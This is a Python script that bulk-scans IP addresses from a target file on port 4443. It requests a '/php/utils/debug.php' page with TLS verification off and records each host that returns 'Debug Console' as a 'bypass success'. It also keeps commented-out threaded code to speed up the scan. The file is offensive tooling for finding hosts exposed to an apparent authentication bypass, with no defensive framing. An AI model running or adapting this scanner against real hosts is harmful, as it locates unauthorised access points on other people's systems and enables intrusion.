import time

import format
import requests
from threading import Thread, Lock

requests.adapters.DEFAULT_RETRIES = 5

success = []


# class MyThread(Thread):
#     def __init__(self, threadID, ip, port):
#         Thread.__init__(self)
#         self.threadID = threadID
#         self.ip = ip
#         self.port = port
#
#     def run(self):
#         print("New ThreadID: ", self.threadID, " ip: ", self.ip)
#         ret = scanner(self.ip, self.port)
#         lock.acquire()
#         if ret:
#             success.append(ret)
#             with open('result3.txt', 'a') as f:
#                 f.write('ip: ' + str(self.ip) + '  port: ' + str(self.port) + ' bypass success\r\n')
#         lock.release()

session = requests.session()
session.keep_alive = False

def scanner(ip, port):

    url1 = 'https://{}:{}/php/utils/debug.php'.format(ip, port)

    try:
        r = session.get(url1, verify=False, timeout=2)
        # print(r.text)
        if 'Debug Console' in r.text:
            print('{}:{} bypass success'.format(ip, port))
            session.close()
            time.sleep(2)
            return [ip, port]
        else:
            print('{}:{} bypass failed'.format(ip, port))
            session.close()
            time.sleep(2)
            return []
    except:
        time.sleep(2)
        session.close()
        return []


def scanner2(ip, port):
    url1 = 'https://{}:{}/php/utils/debug.php'.format(ip, port)

    try:
        r = requests.get(url1, verify=False, stream=True, timeout=2)

        img = r.raw.read()
        if 'Debug Console' in str(img):
            print('{}:{} bypass success'.format(ip, port))
            time.sleep(2)
            return [ip, port]
        else:
            print('{}:{} bypass failed'.format(ip, port))
            time.sleep(2)
            return []
    except:
        time.sleep(2)
        return []


# def run():
#     target_list = format.Format()
#     target_list.port = 4443
#     target_list.ImportTargetFromFile('test.txt')
#     list = target_list.GetTarget()
#     del target_list
#     for i in range(0, len(list), 5):
#         pool = []
#         tmp = list[i:i + 5]
#         for j in range(0, len(tmp)):
#             ip = tmp[j][0]
#             port = tmp[j][1]
#             thread = MyThread(j, ip, port)
#             thread.start()
#             pool.append(thread)
#         for single_thread in pool:
#             single_thread.join()


if __name__ == '__main__':
    # lock = Lock()
    # run()
    line = []
    target_list = format.Format()
    target_list.port = 4443
    target_list.ImportTargetFromFile('test.txt')
    list = target_list.GetTarget()
    del target_list
    for target in list:
        ip = target[0]
        port = target[1]
        ret = scanner2(ip, port)
        if ret:
            line.append(ret)
            with open('result1.txt', 'a') as f:
                f.write('ip: ' + str(ip) + '  port: ' + str(port) + ' bypass success\r\n')

    print(line)
